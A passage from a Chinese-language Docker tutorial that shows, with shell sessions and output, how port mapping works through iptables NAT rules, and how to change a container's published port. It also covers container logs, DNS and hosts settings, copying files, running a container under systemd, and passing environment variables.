<p><em>Thank you for using nginx.</em></p>
</body>
</html>


#自动生成Iptables规则
[root@centos7 ~]#iptables -vnL -t nat
Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
   19  1012 DOCKER     all  -- *     *       0.0.0.0/0            0.0.0.0/0   
        ADDRTYPE match dst-type LOCAL
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
pkts bytes target     prot opt in     out     source               destination 
        
Chain OUTPUT (policy ACCEPT 1 packets, 76 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
    0     0 DOCKER     all  -- *     *       0.0.0.0/0           !127.0.0.0/8 
        ADDRTYPE match dst-type LOCAL
Chain POSTROUTING (policy ACCEPT 1 packets, 76 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
    0     0 MASQUERADE all  -- *     !docker0  172.17.0.0/16        0.0.0.0/0 
          
    0     0 MASQUERADE tcp  -- *     *       172.17.0.2           172.17.0.2 
          tcp dpt:80
    0     0 MASQUERADE tcp  -- *     *       172.17.0.4           172.17.0.4 
          tcp dpt:80
Chain DOCKER (2 references)
 pkts bytes target     prot opt in     out     source               destination 
        
    0     0 RETURN     all  -- docker0 *       0.0.0.0/0            0.0.0.0/0   
        
    0     0 DNAT       tcp  -- !docker0 *       0.0.0.0/0            10.0.0.7   
          tcp dpt:32768 to:172.17.0.2:80
          
          
          
#回到之前的会话窗口，同时按两个键 ctrl+c 退出容器
[root@centos7 ~]#docker run -P nginx 
172.17.0.1 - - [26/Jan/2020:06:44:56 +0000] "GET / HTTP/1.1" 200 612 "-"
"curl/7.29.0" "-"
^C[root@centos7 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS                     PORTS               NAMES
78086069642b       nginx               "nginx -g 'daemon of…"   3 minutes ago   
    Exited (0) 5 seconds ago                       gallant_austin
```

**端口映射的本质就是利用NAT技术实现的**

```
#端口映射前的iptables规则
[root@ubuntu1804 ~]#iptables -S 
-P INPUT ACCEPT
-P FORWARD DROP
-P OUTPUT ACCEPT
-N DOCKER
-N DOCKER-ISOLATION-STAGE-1
-N DOCKER-ISOLATION-STAGE-2
-N DOCKER-USER
-A FORWARD -j DOCKER-USER
-A FORWARD -j DOCKER-ISOLATION-STAGE-1
-A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -o docker0 -j DOCKER
-A FORWARD -i docker0 ! -o docker0 -j ACCEPT
-A FORWARD -i docker0 -o docker0 -j ACCEPT
-A DOCKER-ISOLATION-STAGE-1 -i docker0 ! -o docker0 -j DOCKER-ISOLATION-STAGE-2
-A DOCKER-ISOLATION-STAGE-1 -j RETURN
-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP
-A DOCKER-ISOLATION-STAGE-2 -j RETURN
-A DOCKER-USER -j RETURN
[root@ubuntu1804 ~]#iptables -S -t nat
-P PREROUTING ACCEPT
-P INPUT ACCEPT
-P OUTPUT ACCEPT
-P POSTROUTING ACCEPT
-N DOCKER
-A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER
-A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER
-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE
-A DOCKER -i docker0 -j RETURN


[root@ubuntu1804 ~]#iptables -S > pre.filter
[root@ubuntu1804 ~]#iptables -S -t nat > pre.nat


#实现端口映射
[root@ubuntu1804 ~]#docker run -d -P --name nginx1 nginx
286a3dedf159fbf0a4b895741a9d95562c87b44782ea85c8d172474da8860c36
[root@ubuntu1804 ~]#docker exec -it nginx1 hostname -i
172.17.0.2
[root@ubuntu1804 ~]#docker port nginx1
80/tcp -> 0.0.0.0:32769


#端口映射后的iptables规则
[root@ubuntu1804 ~]#iptables -S 
-P INPUT ACCEPT
-P FORWARD DROP
-P OUTPUT ACCEPT
-N DOCKER
-N DOCKER-ISOLATION-STAGE-1
-N DOCKER-ISOLATION-STAGE-2
-N DOCKER-USER
-A FORWARD -j DOCKER-USER
-A FORWARD -j DOCKER-ISOLATION-STAGE-1
-A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -o docker0 -j DOCKER
-A FORWARD -i docker0 ! -o docker0 -j ACCEPT
-A FORWARD -i docker0 -o docker0 -j ACCEPT
-A DOCKER -d 172.17.0.2/32 ! -i docker0 -o docker0 -p tcp -m tcp --dport 80 -j
ACCEPT
-A DOCKER-ISOLATION-STAGE-1 -i docker0 ! -o docker0 -j DOCKER-ISOLATION-STAGE-2
-A DOCKER-ISOLATION-STAGE-1 -j RETURN
-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP
-A DOCKER-ISOLATION-STAGE-2 -j RETURN
-A DOCKER-USER -j RETURN


[root@ubuntu1804 ~]#iptables -S -t nat
-P PREROUTING ACCEPT
-P INPUT ACCEPT
-P OUTPUT ACCEPT
-P POSTROUTING ACCEPT
-N DOCKER
-A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER
-A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER
-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE
-A POSTROUTING -s 172.17.0.2/32 -d 172.17.0.2/32 -p tcp -m tcp --dport 80 -j
MASQUERADE
-A DOCKER -i docker0 -j RETURN
-A DOCKER ! -i docker0 -p tcp -m tcp --dport 32769 -j DNAT --to-destination
172.17.0.2:80



#对比端口映射前后的变化
[root@ubuntu1804 ~]#iptables -S > post.filter
[root@ubuntu1804 ~]#iptables -S -t nat > post.nat
[root@ubuntu1804 ~]#diff pre.filter post.filter 
13a14
> -A DOCKER -d 172.17.0.2/32 ! -i docker0 -o docker0 -p tcp -m tcp --dport 80 -j
ACCEPT

[root@ubuntu1804 ~]#diff pre.nat post.nat 
8a9
> -A POSTROUTING -s 172.17.0.2/32 -d 172.17.0.2/32 -p tcp -m tcp --dport 80 -j
MASQUERADE
9a11
> -A DOCKER ! -i docker0 -p tcp -m tcp --dport 32769 -j DNAT --to-destination
172.17.0.2:80


#本地和选程都可以访问
[root@ubuntu1804 ~]#curl 127.0.0.1:32769
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
   body {
       width: 35em;
       margin: 0 auto;
       font-family: Tahoma, Verdana, Arial, sans-serif;
   }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>
<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>
<p><em>Thank you for using nginx.</em></p>
</body>
</html>

[root@centos8 ~]#curl 10.0.0.100:32769
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
   body {
       width: 35em;
       margin: 0 auto;
       font-family: Tahoma, Verdana, Arial, sans-serif;
   }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>
<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>
<p><em>Thank you for using nginx.</em></p>
</body>
</html>


#利用iptables 阻止同一个宿主机的其它容器CentOS8的访问
[root@ubuntu1804 ~]#iptables -I DOCKER -s 10.0.0.8 -d 172.17.0.2 -p tcp --dport 
80 -j REJECT
[root@ubuntu1804 ~]#iptables -S
-P INPUT ACCEPT
-P FORWARD DROP
-P OUTPUT ACCEPT
-N DOCKER
-N DOCKER-ISOLATION-STAGE-1
-N DOCKER-ISOLATION-STAGE-2
-N DOCKER-USER
-A FORWARD -j DOCKER-USER
-A FORWARD -j DOCKER-ISOLATION-STAGE-1
-A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -o docker0 -j DOCKER
-A FORWARD -i docker0 ! -o docker0 -j ACCEPT
-A FORWARD -i docker0 -o docker0 -j ACCEPT
-A DOCKER -s 10.0.0.8/32 -d 172.17.0.2/32 -p tcp -m tcp --dport 80 -j REJECT --
reject-with icmp-port-unreachable
-A DOCKER -d 172.17.0.2/32 ! -i docker0 -o docker0 -p tcp -m tcp --dport 80 -j
ACCEPT
-A DOCKER-ISOLATION-STAGE-1 -i docker0 ! -o docker0 -j DOCKER-ISOLATION-STAGE-2
-A DOCKER-ISOLATION-STAGE-1 -j RETURN
-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP
-A DOCKER-ISOLATION-STAGE-2 -j RETURN
-A DOCKER-USER -j RETURN


#测试访问
[root@centos8 ~]#curl 10.0.0.100:32769
curl: (7) Failed to connect to 10.0.0.100 port 32769: Connection refused


[root@centos7 ~]#curl -I 10.0.0.100:32769
HTTP/1.1 200 OK
Server: nginx/1.19.1
Date: Thu, 23 Jul 2020 05:14:01 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Tue, 07 Jul 2020 15:52:25 GMT
Connection: keep-alive
ETag: "5f049a39-264"
Accept-Ranges: bytes
```

##### 48.5.7.8 指定端口映射

```
docker run -p 可以将容器的预定义的指定端口映射到宿主机的相应端口
注意: 多个容器映射到宿主机的端口不能冲突，但容器内使用的端口可以相同

方式1: 容器80端口映射宿主机本地随机端口
docker run -p 80 --name nginx-test-port1 nginx

方式2: 容器80端口映射到宿主机本地端口81
docker run -p 81:80 --name nginx-test-port2 nginx

方式3: 宿主机本地IP:宿主机本地端口:容器端口
docker run  -p 10.0.0.100:82:80 --name nginx-test-port3 docker.io/nginx

方式4: 宿主机本地IP:宿主机本地随机端口:容器端口，默认从32768开始
docker run -p 10.0.0.100::80 --name nginx-test-port4 docker.io/nginx

方式5: 宿主机本机ip:宿主机本地端口:容器端口/协议，默认为tcp协议
docker run  -p 10.0.0.100:83:80/udp --name nginx-test-port5 docker.io/nginx

方式6: 一次性映射多个端口+协议
docker run  -p 8080:80/tcp -p 8443:443/tcp -p 53:53/udp --name nginx-test-port6 nginx
```

**范例:** 

```
[root@centos7 ~]#docker run -d -p 8080:80 -p 8443:443 -p 8053:53/udp nginx
a902b177bb7135ad8a8a179dbf8ce02dcc4806a1136475e59c2310833d7434ab
[root@centos7 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS             PORTS                                                   
            NAMES
a902b177bb71       nginx               "nginx -g 'daemon of…"   5 seconds ago   
    Up 4 seconds        0.0.0.0:8053->53/udp, 0.0.0.0:8080->80/tcp, 
0.0.0.0:8443->443/tcp   affectionate_aryabhata



#杀死nginx进程，nginx将关闭，相应端口也会关闭
[root@centos7 ~]#kill <NGINXPID>
```

**实战案例: 修改已经创建的容器的端口映射关系**

```
#在不删除容器的情况下修改已经创建的容器的端口映射关系
[root@centos7 ~]# docker run -d -p 81:80 --name httpdliu httpd
Unable to find image 'httpd:latest' locally
latest: Pulling from library/httpd
a2abf6c4d29d: Already exists 
dcc4698797c8: Pull complete 
41c22baa66ec: Pull complete 
67283bbdd4a0: Pull complete 
d982c879c57e: Pull complete 
Digest: sha256:0954cc1af252d824860b2c5dc0a10720af2b7a3d3435581ca788dff8480c7b32  
Status: Downloaded newer image for httpd:latest
82cca09d7c4f28e09ab409e8bf83b73d3e917c61fed768e5caa0f7a0ccd7f210   #重要！！


[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
82cca09d7c4f        httpd               "httpd-foreground"   12 seconds ago      Up 11 seconds       0.0.0.0:81->80/tcp   httpdliu
2734274ab350        centos              "/bin/bash"          59 minutes ago      Up 59 minutes                            hopeful_rosalind

[root@centos7 ~]# docker port httpdliu
80/tcp -> 0.0.0.0:81


[root@centos7 ~]# ss -ntl
State      Recv-Q Send-Q                                            Local Address:Port                                                           Peer Address:Port              
LISTEN     0      128                                                           *:22                                                                        *:*                  
LISTEN     0      100                                                   127.0.0.1:25                                                                        *:*                  
LISTEN     0      128                                                        [::]:22                                                                     [::]:*                  
LISTEN     0      100                                                       [::1]:25                                                                     [::]:*                  
LISTEN     0      128                                                        [::]:6666                                                                   [::]:*                  
LISTEN     0      128                                                        [::]:81                                                                     [::]:*   
[root@centos7 ~]# find / -name hostconfig.json
/var/lib/docker/containers/86bf5f853d6a6dcf970555d14cf2f2049a820b9c9d1bf1b853feec78a8d555fd/hostconfig.json
/var/lib/docker/containers/13f555a10eb43f6276979fb48fb5d323ece319309ac7ed2dee0172e0ef560b07/hostconfig.json
/var/lib/docker/containers/2734274ab350f770b3bfb65ca9733570f0ac866dcc2b6d38689b3f8e49ac23e1/hostconfig.json
/var/lib/docker/containers/82cca09d7c4f28e09ab409e8bf83b73d3e917c61fed768e5caa0f7a0ccd7f210/hostconfig.json   #找到这个httpd的CONTAINER ID文件



[root@ubuntu1804 ~]#systemctl stop docker


#PortBindings后80/tcp对应的是容器内部的80端口，HostPort对应的是映射到宿主机的端口80 修改此处为9999
"PortBindings":{"80/tcp":[{"HostIp":"","HostPort":"8000"}]} 
[root@centos7 ~]# vim /var/lib/docker/containers/82cca09d7c4f28e09ab409e8bf83b73d3e917c61fed768e5caa0f7a0ccd7f210/hostconfig.json
{"Binds":null,"ContainerIDFile":"","LogConfig":{"Type":"json-file","Config":{}},"NetworkMode":"default","PortBindings":{"80/tcp":[{"HostIp":"","HostPort":"9999"}]},"RestartPolicy":   #修改此处{"Name":"no","MaximumRetryCount":0},"AutoRemove":false,"VolumeDriver":"","VolumesFrom":null,"CapAdd":null,"CapDrop":null,"Capabilities":null,"Dns":[],"DnsOptions":[],"DnsSearch":[],"ExtraHosts":null,"GroupAdd":null,"IpcMode":"private","Cgroup":"","Links":null,"OomScoreAdj":0,"PidMode":"","Privileged":false,"PublishAllPorts":false,"ReadonlyRootfs":false,"SecurityOpt":null,"UTSMode":"","UsernsMode":"","ShmSize":67108864,"Runtime":"runc","ConsoleSize":[0,0],"Isolation":"","CpuShares":0,"Memory":0,"NanoCpus":0,"CgroupParent":"","BlkioWeight":0,"BlkioWeightDevice":[],"BlkioDeviceReadBps":null,"BlkioDeviceWriteBps":null,"BlkioDeviceReadIOps":null,"BlkioDeviceWriteIOps":null,"CpuPeriod":0,"CpuQuota":0,"CpuRealtimePeriod":0,"CpuRealtimeRuntime":0,"CpusetCpus":"","CpusetMems":"","Devices":[],"DeviceCgroupRules":null,"DeviceRequests":null,"KernelMemory":0,"KernelMemoryTCP":0,"MemoryReservation":0,"MemorySwap":0,"MemorySwappiness":null,"OomKillDisable":false,"PidsLimit":null,"Ulimits":null,"CpuCount":0,"CpuPercent":0,"IOMaximumIOps":0,"IOMaximumBandwidth":0,"MaskedPaths":["/proc/asound","/proc/acpi","/proc/kcore","/proc/keys","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/proc/scsi","/sys/firmware"],"ReadonlyPaths":["/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"]}



[root@ubuntu1804 ~]# systemctl start docker
[root@centos7 ~]# docker start httpdliu
httpdliu
[root@centos7 ~]# docker port httpdliu 
80/tcp -> 0.0.0.0:9999    #端口修改成功！！！
```

##### 48.5.7.9 查看容器的日志

**docker logs 可以查看容器中运行的进程在控制台输出的日志信息**

```
docker logs [OPTIONS] CONTAINER

选项:
--details       Show extra details provided to logs
-f, --follow     Follow log output
--since string   Show logs since timestamp (e.g. 2013-01-02T13:23:37) or 
relative (e.g. 42m for   42 minutes)
--tail string   Number of lines to show from the end of the logs (default 
"all")
-t, --timestamps     Show timestamps
--until string   Show logs before a timestamp (e.g. 2013-01-02T13:23:37) or relative (e.g. 42m     for 42 minutes)
```

**范例: 查看容器日志**

```
[root@ubuntu1804 ~]#docker run alpine /bin/sh -c 'i=1;while true;do echo 
hello$i;let i++;sleep 2;done'
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
188c0c94c7c5: Pull complete 
Digest: sha256:c0e9560cda118f9ec63ddefb4a173a2b2a0347082d7dff7dc14272e7841a5b5a
Status: Downloaded newer image for alpine:latest
hello1
hello2
hello3
hello4
hello5


[root@ubuntu1804 ~]#docker run -d alpine /bin/sh -c 'i=1;while true;do echo 
hello$i;let i++;sleep 2;done'
512622b006c05673630eb04f081f8475400b1cda786b0a8a5d1c1c2fd6dc56a7
[root@ubuntu1804 ~]#docker logs 5126
hello1
hello2
hello3
hello4
hello5
hello6
[root@ubuntu1804 ~]#docker logs --tail 3 5126
hello8
hello9
hello10


#显示时间
[root@ubuntu1804 ~]#docker logs --tail 0 -t 5126
2020-02-25T13:30:07.321390731Z hello17


#持续跟踪
[root@ubuntu1804 ~]#docker logs -f 5126
hello1
hello2
hello3
hello4
...
```

**范例: 查看httpd服务日志**

```
[root@ubuntu1804 ~]#docker pull httpd
Using default tag: latest
latest: Pulling from library/httpd
bb79b6b2107f: Pull complete 
26694ef5449a: Pull complete 
7b85101950dd: Pull complete 
da919f2696f2: Pull complete 
3ae86ea9f1b9: Pull complete 
Digest: sha256:b82fb56847fcbcca9f8f162a3232acb4a302af96b1b2af1c4c3ac45ef0c9b968
Status: Downloaded newer image for httpd:latest
docker.io/library/httpd:latest


[root@ubuntu1804 ~]#docker run -d -p 80:80 --name web1 httpd
9f55b2216f0d65fe010166a78f07f45a47379bb0efa38c4f81f2034a7401907b


[root@ubuntu1804 ~]#docker logs -f web1
AH00558: httpd: Could not reliably determine the server's fully qualified domain 
name, using 172.17.0.3. Set the 'ServerName' directive globally to suppress this 
message
AH00558: httpd: Could not reliably determine the server's fully qualified domain 
name, using 172.17.0.3. Set the 'ServerName' directive globally to suppress this 
message
[Mon Nov 16 01:07:53.780025 2020] [mpm_event:notice] [pid 1:tid 140363582039168] 
AH00489: Apache/2.4.46 (Unix) configured -- resuming normal operations
[Mon Nov 16 01:07:53.780218 2020] [core:notice] [pid 1:tid 140363582039168] 
AH00094: Command line: 'httpd -D FOREGROUND'


10.0.0.8 - - [16/Nov/2020:01:08:23 +0000] "GET / HTTP/1.1" 200 45   #10.0.0.8 curl命令访问日志！！
```

**范例: 查看nginx服务访问日志**

```
#查看一次
[root@centos7 ~]#docker logs nginx-test-port1
10.0.0.1 - - [26/Jan/2020:07:17:16 +0000] "GET /favicon.ico HTTP/1.1" 404 555 "-
" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) 
Chrome/63.0.3239.132 Safari/537.36" "-"
2020/01/26 07:17:16 [error] 6#6: *1 open() "/usr/share/nginx/html/favicon.ico" 
failed (2: No such file or directory), client: 10.0.0.1, server: localhost, 
request: "GET /favicon.ico HTTP/1.1", host: "10.0.0.7:32769"
10.0.0.1 - - [26/Jan/2020:07:17:17 +0000] "GET / HTTP/1.1" 200 612 "-"
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" "-"


#持续查看
[root@centos7 ~]#docker logs -f nginx-test-port1
10.0.0.1 - - [26/Jan/2020:07:17:16 +0000] "GET /favicon.ico HTTP/1.1" 404 555 "-
" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) 
Chrome/63.0.3239.132 Safari/537.36" "-"
2020/01/26 07:17:16 [error] 6#6: *1 open() "/usr/share/nginx/html/favicon.ico" 
failed (2: No such file or directory), client: 10.0.0.1, server: localhost, 
request: "GET /favicon.ico HTTP/1.1", host: "10.0.0.7:32769"
10.0.0.1 - - [26/Jan/2020:07:17:17 +0000] "GET / HTTP/1.1" 200 612 "-"
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" "-
```

##### 48.5.7.10 传递运行命令

```
容器需要有一个前台运行的进程才能保持容器的运行，通过传递运行参数是一种方式，另外也可以在构建镜像的时候指定容器启动时运行的前台命令。

容器里的PID为1的守护进程的实现方式
服务类: 如: Nginx，Tomcat，Apache ，但服务不能停
命令类: 如: tail -f /etc/hosts ，主要用于测试环境，注意: 不要tail -f <服务访问日志> 会产生不必要的磁盘IO
```

**范例**

```
[root@centos7 ~]# docker run -d alpine
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
59bf1c3509f3: Pull complete 
Digest: sha256:21a3deaa0d32a8057914f36584b5288d2e5ecc984380bc0118285c70fa8c9300
Status: Downloaded newer image for alpine:latest
4c829ac9e4c3fff032fc7444807c4fc71e8170fae5f306347eb035773ab5d731



[root@centos7 ~]# docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS                  NAMES
4c829ac9e4c3        alpine              "/bin/sh"                19 seconds ago      Exited (0) 17 seconds ago                          gallant_maxwell
82cca09d7c4f        httpd               "httpd-foreground"       9 hours ago         Up 9 hours                  0.0.0.0:9999->80/tcp   httpdliu
2734274ab350        centos              "/bin/bash"              10 hours ago        Exited (0) 9 hours ago                             hopeful_rosalind
13f555a10eb4        nginx               "/docker-entrypoint.…"   10 hours ago        Exited (137) 10 hours ago                          sweet_darwin
86bf5f853d6a        nginx               "/docker-entrypoint.…"   10 hours ago        Exited (0) 10 hours ago                            unruffled_swartz



[root@centos7 ~]# docker run -d alpine tail -f /etc/hosts
1b16e5889b021d2625fd76b47c2d95715aaf77fd2e685c9be2859a9c0212e54c

[root@centos7 ~]# docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS                      PORTS                  NAMES
1b16e5889b02        alpine              "tail -f /etc/hosts"     12 seconds ago       Up 11 seconds                                      wizardly_noether
4c829ac9e4c3        alpine              "/bin/sh"                About a minute ago   Exited (0) 59 seconds ago                          gallant_maxwell
82cca09d7c4f        httpd               "httpd-foreground"       9 hours ago          Up 9 hours                  0.0.0.0:9999->80/tcp   httpdliu
2734274ab350        centos              "/bin/bash"              10 hours ago         Exited (0) 9 hours ago                             hopeful_rosalind
13f555a10eb4        nginx               "/docker-entrypoint.…"   10 hours ago         Exited (137) 10 hours ago                          sweet_darwin
86bf5f853d6a        nginx               "/docker-entrypoint.…"   10 hours ago         Exited (0) 10 hours ago                            unruffled_swartz
  
  
  
[root@centos7 ~]# docker exec -it 1b16e5889b02 sh
/ #  ps aux
PID   USER     TIME  COMMAND
    1 root      0:00 tail -f /etc/hosts
    6 root      0:00 sh
   11 root      0:00 ps aux
/ # exit


[root@centos7 ~]# docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS                          PORTS                  NAMES
1b16e5889b02        alpine              "tail -f /etc/hosts"     About a minute ago   Up About a minute                                      wizardly_noether
4c829ac9e4c3        alpine              "/bin/sh"                About a minute ago   Exited (0) About a minute ago                          gallant_maxwell
82cca09d7c4f        httpd               "httpd-foreground"       9 hours ago          Up 9 hours                      0.0.0.0:9999->80/tcp   httpdliu
2734274ab350        centos              "/bin/bash"              10 hours ago         Exited (0) 9 hours ago                                 hopeful_rosalind
13f555a10eb4        nginx               "/docker-entrypoint.…"   10 hours ago         Exited (137) 10 hours ago                              sweet_darwin
86bf5f853d6a        nginx               "/docker-entrypoint.…"   10 hours ago         Exited (0) 10 hours ago                                unruffled_swart
```

##### 48.5.7.11容器内部的hosts文件

```
容器会自动将容器的ID加入自已的/etc/hosts文件中，并解析成容器的IP
[root@centos7 ~]# docker run --rm alpine cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.4	08c14c7f17f6   #做了ip解析



#修改容器的hosts文件
[root@ubuntu1804 ~]#docker run -it --rm --add-host www.liusenbiao.com:6.6.6.6 
--add-host www.liusenbiao.org:8.8.8.8  busybox
/ # cat /etc/hosts
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
6.6.6.6 www.liusenbiao.com
8.8.8.8 www.liusenbiao.org
172.17.0.2 449bf0468efd
```

##### 48.5.7.12 指定容器DNS

```
容器的dns服务器，默认采用宿主机的dns地址，可以用下面方式指定其它的DNS地址
将dns地址配置在宿主机
在容器启动时加选项 --dns=x.x.x.x
在/etc/docker/daemon.json 文件中指定xxxxxxxxxx 
```

**范例: 容器的DNS默认从宿主机的DNS获取**

```
[root@ubuntu1804 ~]#systemd-resolve --status|grep -A1 -i "DNS Servers"
         DNS Servers: 180.76.76.76
                      223.6.6.6
[root@ubuntu1804 ~]#docker run -it --rm   centos bash
[root@1364f98c4227 /]# cat /etc/resolv.conf 
nameserver 180.76.76.76
nameserver 223.6.6.6
search magedu.com magedu.org
[root@1364f98c4227 /]# exit
exit
```

**范例: 指定DNS地址**

```
[root@ubuntu1804 ~]#docker run -it --rm --dns 1.1.1.1 --dns 8.8.8.8 centos bash
[root@50e273dab187 /]#  cat /etc/resolv.conf 
search 9_clone6
nameserver 1.1.1.1
nameserver 8.8.8.8
[root@50e273dab187 /]# exit
exit
```

**范例: 配置文件指定DNS和搜索domain名**

```
[root@ubuntu1804 ~]#vim /etc/docker/daemon.json 
[root@ubuntu1804 ~]#cat /etc/docker/daemon.json 
{
  "storage-driver": "overlay2",
  "registry-mirrors": ["https://h1ea2sza.mirror.aliyuncs.com"],
  "dns" : [  "114.114.114.114", "119.29.29.29"],
  "dns-search": [ "liusenbiao.com", "liusenbiao.org"] 
 }
[root@ubuntu1804 ~]# systemctl restart docker
[root@ubuntu1804 ~]#docker run -it --rm centos bash
[root@7a2d8fac6f6b /]# cat /etc/resolv.conf 
search liusenbiao.com liusenbiao.org
nameserver 114.114.114.114
nameserver 119.29.29.29
[root@7a2d8fac6f6b /]# exit
exit


#用--dns指定优先级更高
[root@ubuntu1804 ~]#docker run -it --rm --dns 8.8.8.8 --dns 8.8.4.4 centos bash
[root@80ffe3547b87 /]# cat /etc/resolv.conf 
search liusenbiao.com liusenbiao.org
nameserver 8.8.8.8
nameserver 8.8.4.4
[root@80ffe3547b87 /]# exit
exit



#范例: 指定domain名
[root@ubuntu1804 ~]#docker run -it --rm --dns 1.1.1.1 --dns 8.8.8.8 --dns-search 
a.com --dns-search b.com busybox
/ # cat /etc/resolv.conf 
search a.com b.com
nameserver 1.1.1.1
nameserver 8.8.8.8
```

##### 48.5.7.13 容器内和宿主机之间复制文件

```
docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-
docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH
Options:
  -a, --archive       Archive mode (copy all uid/gid information):
  -L, --follow-link   Always follow symbol link in SRC_PATH
```

**范例:**

```
[root@centos7 ~]# docker run -itd centos
041dea0746d5b8efcbb28fae4a9166813952cb1d133e370329c6d21632023d51
[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
041dea0746d5        centos              "/bin/bash"         4 seconds ago       Up 3 seconds                            confident_villani


#将容器内文件复制到宿主机
[root@centos7 ~]# docker cp -a 041dea0746d5:/etc/centos-release .
[root@centos7 ~]# ls
anaconda-ks.cfg  centos-release  install_docker.sh  nginx.tar  original-ks.cfg  reset.sh
[root@centos7 ~]# cat centos-release 
CentOS Linux release 8.4.2105


#将宿主机文件复制到容器内
[root@centos7 ~]# docker cp /etc/issue 041dea0746d5:/root/
[root@centos7 ~]# docker exec 041dea0746d5  cat /root/issue
\S
Kernel \r on an \m
```

##### 48.5.7.14 使用systemd控制容器运行

```
[root@ubuntu1804 ~]#cat /lib/systemd/system/hello.service
[Unit]
Description=Hello World
After=docker.service
Requires=docker.service
[Service]
TimeoutStartSec=0
ExecStartPre=-/usr/bin/docker kill busybox-hello
ExecStartPre=-/usr/bin/docker rm busybox-hello
ExecStartPre=/usr/bin/docker pull busybox
ExecStart=/usr/bin/docker run --name busybox-hello busybox /bin/sh -c "while true; do echo Hello World; sleep 1; done"
ExecStop=/usr/bin/docker kill busybox-hello
[Install]
WantedBy=multi-user.target



[root@ubuntu1804 ~]#systemctl daemon-reload 
[root@ubuntu1804 ~]#systemctl enable --now hello.service
[root@centos7 ~]# systemctl status hello
● hello.service - Hello World
   Loaded: loaded (/usr/lib/systemd/system/hello.service; enabled; vendor preset: disabled)
   Active: active (running) since Thu 2022-08-04 04:17:41 CST; 41s ago
 Main PID: 1651 (docker)
   CGroup: /system.slice/hello.service
           └─1651 /usr/bin/docker run --name busybox-hello busybox /bin/sh -c while true; do echo Hello World; sleep 1; done

Aug 04 04:18:14 centos7.9_clone6 docker[1651]: Hello World
Aug 04 04:18:15 centos7.9_clone6 docker[1651]: Hello World
Aug 04 04:18:16 centos7.9_clone6 docker[1651]: Hello World
Aug 04 04:18:17 centos7.9_clone6 docker[1651]: Hello World
Aug 04 04:18:18 centos7.9_clone6 docker[1651]: Hello World
Aug 04 04:18:19 centos7.9_clone6 docker[1651]: Hello World
Aug 04 04:18:20 centos7.9_clone6 docker[1651]: Hello World
Aug 04 04:18:21 centos7.9_clone6 docker[1651]: Hello World
Aug 04 04:18:22 centos7.9_clone6 docker[1651]: Hello World
Aug 04 04:18:23 centos7.9_clone6 docker[1651]: Hello World
```

##### 48.5.7.15 传递环境变量

```
有些容器运行时，需要传递变量，可以使用 -e <参数> 或 --env-file <参数文件> 实现
范例: 传递变量创建MySQL
变量参考链接: https://hub.docker.com/_/mysql
```

**示例：**

```
#MySQL容器运行时需要指定root的口令
[root@centos7 ~]# docker run -d --name mysql01 mysql:5.7.32
Unable to find image 'mysql:5.7.32' locally
5.7.32: Pulling from library/mysql
a076a628af6f: Pull complete 
f6c208f3f991: Pull complete 
88a9455a9165: Pull complete 
406c9b8427c6: Pull complete 
7c88599c0b25: Pull complete 
